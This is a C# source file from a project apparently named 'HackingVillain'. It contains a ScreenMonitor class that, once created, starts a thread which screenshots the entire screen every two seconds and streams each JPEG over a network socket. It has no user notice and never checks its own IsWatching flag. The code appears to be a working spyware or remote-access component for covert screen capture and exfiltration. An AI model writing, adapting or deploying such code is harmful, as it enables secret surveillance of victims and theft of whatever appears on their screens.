using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Drawing;
using System.IO;
using AwesomeSockets.Domain.Sockets;
using AwesomeSockets.Sockets;

using Buffer = AwesomeSockets.Buffers.Buffer;

namespace HackingVillain
{
    public class ScreenMonitor
    {
        public bool IsWatching = true;

        ISocket _client;
        public ScreenMonitor(ISocket client)
        {
            _client = client;
            Thread t = new Thread(Update);
            t.Start();
        }

        public void Update()
        {
            while (true)
            {
                var img = CaptureScreen();
                using (var ms = new MemoryStream())
                {
                    img.Save(ms, System.Drawing.Imaging.ImageFormat.Jpeg);
                    Buffer buf = Buffer.New();
                    Buffer.Add(buf, ms.ToArray());
                    AweSock.SendMessage(_client, buf);
                }
                Thread.Sleep(2000);
            }
        }

        public static Image CaptureScreen()
        {
            Size sz = System.Windows.Forms.SystemInformation.VirtualScreen.Size;
            Bitmap bmp = new Bitmap(sz.Width, sz.Height);
            Graphics g = Graphics.FromImage(bmp);
            g.CopyFromScreen(0, 0, 0, 0, sz);
            return bmp;
        }
    }
}
